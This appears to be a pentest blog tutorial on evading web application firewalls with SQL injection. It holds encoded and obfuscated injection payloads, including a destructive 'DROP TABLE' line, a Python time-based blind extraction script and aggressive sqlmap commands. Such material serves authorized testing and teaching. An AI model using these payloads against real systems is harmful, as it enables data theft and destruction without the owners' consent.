SQL Injection: Modern WAF Bypass Techniques

web sqli bypass pentest
⚠️ Disclaimer: This content is for educational purposes only. Only test on systems you own or have explicit written permission to test.

Introduction

Web Application Firewalls (WAFs) are often the last line of defense between an attacker and a vulnerable SQL injection endpoint. Modern WAFs from vendors like Cloudflare, Akamai, and AWS WAF have become increasingly sophisticated, but they're not impenetrable.

In this post, we'll explore practical techniques for bypassing WAF protections during authorized penetration tests, focusing on encoding tricks, case manipulation, and comment injection.

Understanding WAF Detection

WAFs primarily operate in two modes: signature-based detection and behavioral analysis. Signature-based detection looks for known malicious patterns, while behavioral analysis examines request patterns and anomalies.

Most WAFs will block classic payloads like: 

' OR 1=1--
' UNION SELECT 1,2,3--
'; DROP TABLE users;--

The key insight is that SQL is flexible — there are often dozens of ways to express the same query, and WAFs can't catch them all.

Encoding Tricks

URL encoding, double URL encoding, and Unicode encoding are some of the most reliable bypass techniques. Many WAFs decode once before checking, but the application server may decode multiple times. 

# Standard payload (blocked)
curl "https://target.com/search?q=' OR 1=1--"

# URL-encoded (might bypass)
curl "https://target.com/search?q=%27%20OR%201%3D1--"

# Double URL-encoded
curl "https://target.com/search?q=%2527%2520OR%25201%253D1--"

# Unicode encoding
curl "https://target.com/search?q=\u0027 OR 1=1--"

Comment Injection & Whitespace

SQL supports various comment styles that can be used to break up keywords and confuse WAF pattern matching: 

-- Standard comment bypass
'/**/OR/**/1=1--

-- MySQL inline comment with version
'/*!50000 OR*/ 1=1--

-- Mixed case (case-insensitive SQL but WAF is case-sensitive)
' oR 1=1--
' Or 1=1--
' OR/**/ 1=1--

-- Tab/newline whitespace
'%09OR%091=1--  -- Tab characters
'%0aOR%0a1=1--  -- Newlines

UNION SELECT Bypass

UNION-based injection is heavily filtered. Here are techniques to bypass UNION SELECT detection: 

-- Scientific notation for numbers
' UNION SELECT 1e0,2e0,3e0--

-- UNION with parentheses
' UNION(SELECT(1),(2),(3))--

-- All%00 null byte injection
'%00UNION%00SELECT%001,2,3--

-- Minus sign trick
'UNION--%0ASELECT 1,2,3--

Time-Based Blind Injection

When output is not reflected, time-based blind injection can confirm vulnerability without triggering WAF UNION/UNION SELECT rules: 

import requests
import time

def time_based_sqli(url, column, table):
    payload = f"1; IF(1=1,WAITFOR DELAY '0:0:5',0)--"
    start = time.time()
    r = requests.get(url, params={'id': payload})
    elapsed = time.time() - start
    
    if elapsed > 4.5:
        print(f"[+] Vulnerable! Response delayed {elapsed:.1f}s")
        return True
    return False

# Exfiltrate data character by character
def extract_data(url, query):
    result = ""
    for i in range(1, 50):
        for char in "abcdefghijklmnopqrstuvwxyz0123456789{}_-":
            payload = (
                f"1; IF(ASCII(SUBSTRING(({query}),{i},1))="
                f"{ord(char)},WAITFOR DELAY '0:0:1',0)--"
            )
            start = time.time()
            requests.get(url, params={'id': payload})
            if time.time() - start > 0.9:
                result += char
                print(f"\r[*] {result}", end="")
                break
    return result

Automating Bypasses with SQLMap

SQLMap has a tamper script system for automating WAF bypasses. Always use --random-agent and appropriate tamper scripts: 

# Basic WAF bypass with tamper scripts
sqlmap -u "https://target.com/page?id=1" \
  --tamper=space2comment,randomcase,charencode \
  --random-agent \
  --level=5 \
  --risk=3 \
  -p id

# Useful tamper scripts:
# space2comment  - replaces spaces with /**/
# randomcase     - randomizes keyword case
# charencode     - URL encodes characters
# between        - replaces > with NOT BETWEEN 0 AND
# equaltolike    - replaces = with LIKE

Conclusion

WAF bypass is an arms race — vendors patch known bypasses, researchers find new ones. The most effective approach combines multiple techniques and always starts with understanding what the WAF is actually filtering.

💡 Pro tip: If you find a live WAF bypass on a real application during a bug bounty, document it thoroughly before reporting. Include the exact payload, the WAF vendor/version if known, and the impact.
